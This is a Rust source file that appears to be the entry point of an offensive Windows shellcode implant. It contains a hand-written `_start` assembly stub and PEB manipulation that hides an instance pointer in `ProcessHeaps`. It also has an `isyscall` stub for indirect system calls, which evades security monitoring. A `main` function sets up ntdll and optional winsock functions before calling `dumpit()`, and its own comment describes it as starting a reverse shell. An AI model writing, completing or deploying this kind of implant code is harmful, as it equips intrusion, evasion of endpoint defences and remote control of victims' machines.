use core::{arch::global_asm, ffi::c_void};

use crate::{
    dumpit,
    instance::Instance,
    native::{ntapi::init_ntdll_funcs, ntdef::find_peb},
};

#[cfg(feature = "debug")]
use crate::debug::k32::init_kernel32_funcs;

#[cfg(feature = "remote")]
use crate::remote::winsock::init_winsock_funcs;

#[no_mangle]
pub extern "C" fn initialize() {
    unsafe {
        // Stack allocation of Instance
        let mut instance = Instance::new();

        // Append instance address to PEB.ProcessHeaps
        let instance_ptr: *mut c_void = &mut instance as *mut _ as *mut c_void;

        let peb = find_peb();
        let process_heaps = (*peb).process_heaps as *mut *mut c_void;
        let number_of_heaps = (*peb).number_of_heaps as usize;

        // Increase the NumberOfHeaps
        (*peb).number_of_heaps += 1;

        // Append the instance_ptr
        *process_heaps.add(number_of_heaps) = instance_ptr;

        // Proceed to main function
        main();
    }
}

/// Initializes system modules and functions, and then starts a reverse shell.
unsafe fn main() {
    init_ntdll_funcs();

    #[cfg(feature = "debug")]
    init_kernel32_funcs();

    #[cfg(feature = "remote")]
    init_winsock_funcs();

    dumpit();
}

global_asm!(
    r#"
.globl _start
.globl isyscall

.section .text

_start:
    push  rsi
    mov   rsi, rsp
    and   rsp, 0xFFFFFFFFFFFFFFF0
    sub   rsp, 0x20
    call  initialize
    mov   rsp, rsi
    pop   rsi
    ret

isyscall:
    mov [rsp - 0x8],  rsi
    mov [rsp - 0x10], rdi
    mov [rsp - 0x18], r12

    xor r10, r10			
    mov rax, rcx			
    mov r10, rax

    mov eax, ecx

    mov r12, rdx
    mov rcx, r8

    mov r10, r9
    mov rdx,  [rsp + 0x28]
    mov r8,   [rsp + 0x30]
    mov r9,   [rsp + 0x38]

    sub rcx, 0x4
    jle skip

    lea rsi,  [rsp + 0x40]
    lea rdi,  [rsp + 0x28]

    rep movsq
skip:
    mov rcx, r12

    mov rsi, [rsp - 0x8]
    mov rdi, [rsp - 0x10]
    mov r12, [rsp - 0x18]

    jmp rcx
"#
);

extern "C" {
    pub fn _start();
}

#[cfg(not(feature = "debug"))]
#[macro_export]
macro_rules! debug_println {
    ($msg:expr) => {};
    ($msg:expr, $val:expr) => {};
    ($msg:expr, $val:expr, $as_hex:expr) => {};
}
